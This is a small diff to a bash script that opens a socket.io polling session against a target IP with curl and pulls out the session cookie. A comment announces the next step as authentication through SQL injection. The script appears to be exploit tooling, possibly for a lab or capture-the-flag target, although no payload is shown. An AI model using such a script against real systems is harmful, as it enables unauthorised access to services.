@@ -17,8 +17,8 @@ curl -s -X GET "http://$target_ip" -L > /dev/null
 curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d5_o" -c "/work/1-cookies.txt" -L
 IO=$(grep io "/work/1-cookies.txt" | awk '{print $7}')
 echo "--> Session initiated with cookie IO ${IO}"
-
-curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d6Aw&sid=$IO" -b "/work/1-cookies.txt" -L -v
+sleep 2
+curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d6Aw&sid=$IO" -b "/work/1-cookies.txt" -L
 
 # Authenticate using SQL injection session
 echo "2 - AUTHENTICATE THROUGH INJECTION"
